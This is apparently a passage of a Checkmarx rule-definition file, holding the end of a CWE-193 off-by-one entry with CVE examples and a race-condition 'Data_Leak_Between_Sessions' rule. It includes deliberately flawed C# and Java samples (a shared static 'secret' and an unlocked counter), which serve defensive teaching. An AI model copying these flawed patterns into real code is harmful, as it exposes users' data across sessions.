&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0346" target="_blank"&gt;CVE-2004-0346&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0005" target="_blank"&gt;CVE-2004-0005&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0356" target="_blank"&gt;CVE-2003-0356&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1496" target="_blank"&gt;CVE-2001-1496&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0342" target="_blank"&gt;CVE-2004-0342&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;This is an interesting example that might not be
an off-by-one.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0609" target="_blank"&gt;CVE-2001-0609&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;An off-by-one enables a terminating null to be
overwritten, which causes 2 strings to be merged and enable a format
string.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1745" target="_blank"&gt;CVE-2002-1745&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Off-by-one error allows source code disclosure of
files with 4 letter extensions that match an accepted 3-letter
extension.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1816" target="_blank"&gt;CVE-2002-1816&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Off-by-one buffer
overflow.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1721" target="_blank"&gt;CVE-2002-1721&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Off-by-one error causes an snprintf call to
overwrite a critical internal variable with a null
value.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0466" target="_blank"&gt;CVE-2003-0466&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Off-by-one error in function used in many products
leads to a buffer overflow during pathname management, as demonstrated using
multiple commands in an FTP server.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0625" target="_blank"&gt;CVE-2003-0625&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Off-by-one error allows read of sensitive memory
via a malformed request.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4574" target="_blank"&gt;CVE-2006-4574&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Chain: security monitoring product has an
off-by-one error that leads to unexpected length values, triggering an
assertion.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_193_Potential Mitigations" id="oc_193_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt; When copying character arrays or using character manipulation
methods, the correct size parameter must be used to account for the null
terminator that needs to be added at the end of the array. Some examples
of functions susceptible to this weakness in C include strcpy(),
strncpy(), strcat(), strncat(), printf(), sprintf(), scanf() and
sscanf(). &lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_193_Relationships" id="oc_193_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;682&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=682" target="_blank"&gt;Incorrect Calculation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;741&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=741" target="_blank"&gt;CERT C Secure Coding Section 07 - Characters and Strings (STR)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses Addressed by the CERT C Secure Coding Standard &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;734&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanPrecede&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;119&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=119" target="_blank"&gt;Failure to Constrain Operations within the Bounds of a Memory Buffer&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanPrecede&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;170&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=170" target="_blank"&gt;Improper Null Termination&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanPrecede&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;617&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=617" target="_blank"&gt;Reachable Assertion&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationship Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationship Notes&lt;/div&gt;&lt;div name="oc_193_Relationship Notes" id="oc_193_Relationship Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;This is not always a buffer overflow. For example, an off-by-one error
could be a factor in a partial comparison, a read from the wrong memory
location, an incorrect conditional, etc.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Research Gaps"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Research Gaps&lt;/div&gt;&lt;div name="oc_193_Research Gaps" id="oc_193_Research Gaps" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;Under-studied. It requires careful code analysis or black box testing,
where inputs of excessive length might not cause an error. Off-by-ones are
likely triggered by extensive fuzzing, with the attendant diagnostic
problems.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_193_Taxonomy Mappings" id="oc_193_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Off-by-one Error&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CERT C Secure Coding&lt;/td&gt;&lt;td valign="top"&gt;STR31-C&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Guarantee that storage for strings has sufficient space for
character data and the null terminator&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_193_References" id="oc_193_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Halvar Flake. "Third Generation Exploits". presentation at Black Hat Europe
2001. &amp;lt;&lt;a href="http://www.blackhat.com/presentations/bh-europe-01/halvar-flake/bh-europe-01-halvarflake.ppt" target="_blank"&gt;http://www.blackhat.com/presentations/bh-europe-01/halvar-flake/bh-europe-01-halvarflake.ppt&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Steve Christey. "Off-by-one errors: a brief explanation". Secprog and SC-L mailing list
posts. 2004-05-05. &amp;lt;&lt;a href="http://marc.theaimsgroup.com/?l=secprog&amp;amp;m=108379742110553&amp;amp;w=2" target="_blank"&gt;http://marc.theaimsgroup.com/?l=secprog&amp;amp;m=108379742110553&amp;amp;w=2&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;klog. "The Frame Pointer Overwrite". Phrack Issue 55, Chapter 8. 1999-09-09. &amp;lt;&lt;a href="http://kaizo.org/mirrors/phrack/phrack55/P55-08" target="_blank"&gt;http://kaizo.org/mirrors/phrack/phrack55/P55-08&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;G. Hoglund and
G. McGraw. "Exploiting Software: How to Break Code (The buffer overflow
chapter)". Addison-Wesley. February 2004. &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_193_Content History" id="oc_193_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Alternate Terms, Common Consequences,
Relationships, Observed Example, Relationship Notes,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-11-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples,
Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-02-16&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_618</key><name>Data_Leak_Between_Sessions</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;A&amp;nbsp;race condition can cause erratic or unexpected application behavior. Additionally, if a race condition&amp;nbsp;can be influenced directly by users, an attacker may choose to replay a race condition until they obtain a desired&amp;nbsp;result, allowing them to induce certain application behavior that is not part of its intentional design.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Concurrent instances, such as threads or servlets, can run concurrently. Failure to ensure all of their operations on a shared resource are done atomically and in a synchronized manner may result in threads overriding each other's actions or outputs. For example, a logical state&amp;nbsp;may have been validated prior to an update operation, but the update operation itself was only&amp;nbsp;performed after the previously validated state has changed due to code concurrency.&lt;/p&gt;
&lt;p class="MsoListParagraphCxSpLast" dir="LTR" style="margin: 0cm 0cm 8pt 36pt; text-indent: -18pt; direction: ltr; unicode-bidi: embed;"&gt;&lt;!-- [if !supportLists]--&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Consider allocating independent&amp;nbsp;resources&amp;nbsp;for concurrent logical processes, unless required.&lt;/p&gt;
&lt;p&gt;Where resource sharing is required, utilize a locking mechanism when handling shared resources to ensure that actions are performed atomically by the current process, so that these logical processes&amp;nbsp;are not overridden or disrupted by any other concurrent process.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;ASPX Setting and Then Reading A Singleton Variable That May Have Been Set By Another Request&lt;/h4&gt;&lt;pre&gt;// Default.aspx.cs
using System;
using System.ComponentModel.DataAnnotations;
using System.Web.DynamicData;

public partial class _Default : System.Web.UI.Page {
    public static string secret = "None";
    protected void Page_Load(object sender, EventArgs e) {
        secret = Request.Params["secret"];
    }
}

// Default.aspx - the "secret" printed here may be different to the secret obtained and set from Request,
// if another user makes a request with a different "secret", writing a different "secret" altogether
&lt;%@ Page Language="C#" MasterPageFile="~/Site.master" CodeFile="Default.aspx.cs" Inherits="_Default" %&gt;
&lt;asp:Content ID="Content1" ContentPlaceHolderID="ContentPlaceHolder1" Runat="Server"&gt;
    &lt;%= secret %&gt; 
&lt;/asp:Content&gt;&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Threads Incrementing The Same Variable Without Locking&lt;/h4&gt;&lt;pre&gt;	public static class FooIncrement {
		static int foo = 0;
		static Object lock = new Object();
		public static int generateFoo() throws InterruptedException {
			IncrementFooThread[] threadArray = new IncrementFooThread[10000];
			for (int i = 0; i &lt; threadArray.length; i++) {
				threadArray[i] = new IncrementFooThread(); 
				threadArray[i].start();
			}
			for (IncrementFooThread threaderThread : threadArray) {
				threaderThread.join();
			}
			return foo;
		}
		public static class IncrementFooThread extends Thread {
			public void run() 
			{
				foo++; //two threads may separately read the same value of foo before any of them update it,
              		   //resulting in two threads setting the same value of foo
			}
			
		}
	}&lt;/pre&gt;&lt;h4&gt;Adding A Lock Object to Synchronize a Shared Resource&lt;/h4&gt;&lt;pre&gt;	public static class FooIncrement {
		static int foo = 0;
		static Object lock = new Object();
		public static int generateFoo() throws InterruptedException {
			IncrementFooThread[] threadArray = new IncrementFooThread[10000];
			for (int i = 0; i &lt; threadArray.length; i++) {
				threadArray[i] = new IncrementFooThread(); 
				threadArray[i].start();
			}
			for (IncrementFooThread threaderThread : threadArray) {
				threaderThread.join();
			}
			return foo;
		}
		public static class IncrementFooThread extends Thread {
			public void run() 
			{
				synchronized (lock) {
					foo++; //foo is atomically incremented
				}
			}
			
		}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule></rules>